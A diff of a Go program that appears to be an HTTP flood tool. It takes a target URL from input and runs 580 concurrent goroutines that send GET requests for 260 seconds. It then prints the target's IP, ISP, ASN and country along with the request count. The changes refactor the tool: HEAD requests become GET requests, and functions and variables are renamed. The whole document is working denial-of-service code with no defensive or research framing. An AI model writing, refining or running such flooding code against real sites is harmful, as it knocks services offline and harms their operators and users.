@@ -17,15 +17,15 @@ var (
     startTime   = time.Now()
     requests    int64
     concurrency = 580
-    duration    = 260 * time.Second
 )
 
 const (
-    P = "\033[0m"
-    R = "\033[31m"
-    G = "\033[32m"
+    P  = "\033[0m"
+    R    = "\033[31m"
+    G  = "\033[32m"
     Y = "\033[33m"
-    C = "\033[36m"
+    B   = "\033[34m"
+    C   = "\033[36m"
 )
 
 func L() {
@@ -72,37 +72,25 @@ func I(host string) string {
     return ips[0].String()
 }
 
-func HI(url string) string {
-    parts := strings.Split(url, "/")
-    if len(parts) >= 3 {
-        return parts[2]
-    }
-    return url
-}
-
-func fire(url string, wg *sync.WaitGroup, stop <-chan struct{}) {
+func A(url string, duration time.Duration, wg *sync.WaitGroup, stopChan chan struct{}) {
     defer wg.Done()
-    client := &http.Client{
-        Timeout: 2 * time.Second,
-        Transport: &http.Transport{
-            DisableKeepAlives: true,
-            MaxIdleConns:      0,
-        },
-    }
-    end := time.Now().Add(duration)
+    client := &http.Client{Timeout: 2 * time.Second}
+    endTime := time.Now().Add(duration)
     for {
         select {
-        case <-stop:
+        case <-stopChan:
             return
         default:
-            if time.Now().After(end) {
-                return
+            req, err := http.NewRequest("GET", url, nil)
+            if err != nil {
+                continue
             }
-            req, _ := http.NewRequest("HEAD", url, nil)
-            req.Header.Set("Accept", "*/*")
-            _, err := client.Do(req)
+            _, err = client.Do(req)
             if err == nil {
                 atomic.AddInt64(&requests, 1)
+            }
+            if time.Now().After(endTime) {
+                return
             }
         }
     }
@@ -115,32 +103,41 @@ func main() {
     url, _ := reader.ReadString('\n')
     url = strings.TrimSpace(url)
 
+    durasi := 260 * time.Second
     var wg sync.WaitGroup
-    stop := make(chan struct{})
+    stopChan := make(chan struct{})
 
     for i := 0; i < concurrency; i++ {
         wg.Add(1)
-        go fire(url, &wg, stop)
+        go A(url, durasi, &wg, stopChan)
     }
 
-    time.Sleep(duration)
-    close(stop)
+    time.Sleep(durasi)
+    close(stopChan)
     wg.Wait()
 
     elapsed := time.Since(startTime)
     host := HI(url)
-    ip := I(host)
-    isp, asn, country := D(ip)
+    hostIP := I(host)
+    ispHost, asnHost, countryHost := D(hostIP)
 
     L()
     fmt.Println(R + "╔════════════════════════════════════════════════╗" + P)
-    fmt.Printf("%s│%s Link     : %s%s\n", R, P, Y, url)
-    fmt.Printf("%s│%s Host     : %s%s\n", R, P, Y, host)
-    fmt.Printf("%s│%s IP       : %s%s\n", R, P, Y, ip)
-    fmt.Printf("%s│%s ISP      : %s%s\n", R, P, C, isp)
-    fmt.Printf("%s│%s ASN      : %s%s\n", R, P, C, asn)
-    fmt.Printf("%s│%s Country  : %s%s\n", R, P, C, country)
-    fmt.Printf("%s│%s Duration : %s%s\n", R, P, G, elapsed)
-    fmt.Printf("%s│%s Requests : %s%d\n", R, P, G, requests)
+    fmt.Printf("%s│%s Link   : %s%s\n", R, P, Y, url)
+    fmt.Printf("%s│%s Host    : %s%s\n", R, P, Y, host)
+    fmt.Printf("%s│%s Ip      : %s%s\n", R, P, Y, hostIP)
+    fmt.Printf("%s│%s Isp     : %s%s\n", R, P, C, ispHost)
+    fmt.Printf("%s│%s Asn     : %s%s\n", R, P, C, asnHost)
+    fmt.Printf("%s│%s Country : %s%s\n", R, P, C, countryHost)
+    fmt.Printf("%s│%s Duration: %s\n", R, P, elapsed)
+    fmt.Printf("%s│%s Requests: %s%d\n", R, P, Y, requests)
     fmt.Println(R + "╚════════════════════════════════════════════════╝" + P)
+}
+
+func HI(url string) string {
+    parts := strings.Split(url, "/")
+    if len(parts) >= 3 {
+        return parts[2]
+    }
+    return url
 }
